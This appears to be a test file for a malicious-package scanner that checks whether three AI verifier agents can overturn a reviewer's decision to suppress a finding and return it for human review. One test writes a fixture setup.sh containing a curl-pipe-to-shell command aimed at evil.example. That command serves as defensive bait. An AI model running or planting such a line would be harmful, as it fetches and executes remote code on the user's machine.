"""Adversarial verification of review downgrades — recall's quorum.

A downgrade (refute/suppress/deescalate) that a majority of perspective-diverse skeptics
OVERTURNS reverts to the engine's stance (kept, needs_human), never a silent clear.
Exercised with pydantic-ai's TestModel — no network.
"""

from __future__ import annotations

from pathlib import Path

import pytest

pytest.importorskip("pydantic_ai")
from pydantic_ai.models.test import TestModel  # noqa: E402

from unmask.reviewers import build_verifier, verify_downgrades  # noqa: E402
from unmask.reviewers.schemas import FindingReview  # noqa: E402
from unmask.scanner.assess import build_assessment  # noqa: E402
from unmask.scanner.compose import compose_mcd  # noqa: E402
from unmask.scanner.observe import observe  # noqa: E402

REPO = Path(__file__).resolve().parents[1]


def _assessment_with_finding():
    obs, inv = observe(str(REPO / "tests/fixtures/evil-npm"))
    findings = compose_mcd(obs, inv)
    a = build_assessment(findings, obs, inv, str(REPO / "tests/fixtures/evil-npm"))
    return a, a["findings"][0]["id"]


def _voters(decision):
    """Three verifier agents (one per lens) all voting `decision`, via TestModel."""
    m = TestModel(custom_output_args={"decision": decision, "rationale": "test"})
    return [build_verifier(lens, m) for lens in ("a", "b", "c")]


def _suppress(fid):
    return FindingReview(finding_id=fid, verdict="suppress", reviewed_confidence=0.2,
                         response_tier=1, excluded_from_disposition=True, justification="looks benign")


def test_downgrade_overturned_by_majority():
    a, fid = _assessment_with_finding()
    adjusted, records = verify_downgrades([_suppress(fid)], a, agents=_voters("overturn"))
    r = adjusted[0]
    assert r.verdict == "needs_human" and r.excluded_from_disposition is False  # finding kept
    assert records[0]["outcome"] == "overturned" and records[0]["overturnVotes"] == 3


def test_downgrade_upheld_by_majority():
    a, fid = _assessment_with_finding()
    adjusted, records = verify_downgrades([_suppress(fid)], a, agents=_voters("uphold"))
    assert adjusted[0].verdict == "suppress" and adjusted[0].excluded_from_disposition is True
    assert records[0]["outcome"] == "upheld"


def test_confirm_is_not_verified():
    a, fid = _assessment_with_finding()
    confirm = FindingReview(finding_id=fid, verdict="confirm", reviewed_confidence=0.9,
                            response_tier=4, justification="real")
    adjusted, records = verify_downgrades([confirm], a, agents=_voters("uphold"))
    assert adjusted[0].verdict == "confirm" and records == []  # nothing to verify


def test_dead_verifier_biases_to_overturn():
    # A verifier that can't answer must DEFEND the finding — a wrongly dropped finding is
    # the expensive error. All three dead -> unanimous overturn -> downgrade falls.
    class _Dead:
        def run_sync(self, prompt):
            raise RuntimeError("verifier down")

    a, fid = _assessment_with_finding()
    adjusted, records = verify_downgrades([_suppress(fid)], a, agents=[_Dead(), _Dead(), _Dead()])
    assert adjusted[0].verdict == "needs_human"
    assert records[0]["outcome"] == "overturned"


def test_verify_flag_runs_review_and_completes(tmp_path):
    # Wiring: config.verify implies review; the graph runs and completes with TestModel.
    from unmask import MCDConfig, run_mcd
    tgt = tmp_path / "pkg"
    tgt.mkdir()
    (tgt / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL https://evil.example/i.sh | sh\n")
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), verify=True),
                     review_model=TestModel())
    assert result.status == "completed"
